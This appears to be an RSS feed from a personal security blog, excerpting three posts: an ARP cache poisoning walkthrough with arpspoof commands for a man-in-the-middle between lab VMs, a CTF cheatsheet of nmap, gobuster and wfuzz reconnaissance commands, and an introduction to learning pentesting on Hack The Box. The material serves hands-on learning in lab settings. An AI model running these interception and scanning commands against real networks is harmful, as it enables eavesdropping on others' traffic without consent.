<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>hacking on J&#39;aime pas les piles</title>
    <link>https://blog.bapt.name/tags/hacking/</link>
    <description>Recent content in hacking on J&#39;aime pas les piles</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>This work is licensed under WTFPL.</copyright>
    <lastBuildDate>Sat, 02 May 2020 18:19:48 +0200</lastBuildDate><atom:link href="https://blog.bapt.name/tags/hacking/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Arpspoof Arp Cache Poisoning</title>
      <link>https://blog.bapt.name/2020/05/02/arpspoof-arp-cache-poisoning/</link>
      <pubDate>Sat, 02 May 2020 18:19:48 +0200</pubDate>
      
      <guid>https://blog.bapt.name/2020/05/02/arpspoof-arp-cache-poisoning/</guid>
      <description>Goal: tricking arp cache to redirect network traffic to us &amp;ldquo;Man in the middle&amp;rdquo;.
 VM1: 192.168.1.244 VM2: 192.168.1.145 GW: 192.168.1.1  Prerequisites # Enable ip forwarding sudo sh -c &amp;#39;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&amp;#39; # Install arpspoof (part of dsniff) sudo apt install dsniff Listening to traffic between two VMs # Checking arp table on VM1/VM2 allow to check IP/Mac arp -a # Start redirecting traffic from VM1 to VM2 to us sudo arpspoof -i eth0 -t $VM1 $VM2 # Start redirecting traffic from VM2 to VM1 to us sudo arpspoof -i eth0 -t $VM2 $VM1 # Checking arp table on VM1/VM2 allow to check IP/Mac arp -a # Using wireshark will allow to check/follow traffic sudo whireshark Pretending to be the default gateway # Checking arp table allow to check IP/Mac arp -a # Start redirecting traffic from VM1 to VM2 to us sudo arpspoof -i eth0 -t $VM1 $GW # Start redirecting traffic from VM2 to VM1 to us sudo arpspoof -i eth0 -t $GW $VM1 # Using wireshark will allow to check/follow traffic sudo whireshark </description>
    </item>
    
    <item>
      <title>Hacking Cheatsheet</title>
      <link>https://blog.bapt.name/2020/04/14/hacking-cheatsheet/</link>
      <pubDate>Tue, 14 Apr 2020 12:51:06 +0200</pubDate>
      
      <guid>https://blog.bapt.name/2020/04/14/hacking-cheatsheet/</guid>
      <description>Some notes while doing some CTF.
Collecting information about an IP  Shodan anti-hacker-alliance.com  Port scan with nmap sudo nmap -sC -sV -oA outputfile $IP Web inventory Searching for webdirectories gobuster dir -u http://oouch.htb:5000/ \  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \  | tee gobuster-directories.txt Searching for domain names gobuster vhost -u http://oouch.htb:5000/ \  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \  | tee gobuster-vhosts.txt wfuzz --hh 0 --hc 302 \  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \  -H &amp;#39;Host: FUZZ.</description>
    </item>
    
    <item>
      <title>Adventures with Pentesting</title>
      <link>https://blog.bapt.name/2020/04/12/adventures-with-pentesting/</link>
      <pubDate>Sun, 12 Apr 2020 11:42:34 +0200</pubDate>
      
      <guid>https://blog.bapt.name/2020/04/12/adventures-with-pentesting/</guid>
      <description>Learning by doing with Hack The Box (HTB) During those locked down times I&amp;rsquo;ve been starting to play with Hack The Box, an online platform allowing to do Penetration Testing, using a lab of Virtual Machines designed for this.
It&amp;rsquo;s some kind of gamified hacking: you have a profile, you earn points and you can level up. At HTB I&amp;rsquo;m gwarf.
It&amp;rsquo;s a great way of starting to learn pentesting without causing troubles and in a legit environment.</description>
    </item>
    
  </channel>
</rss>
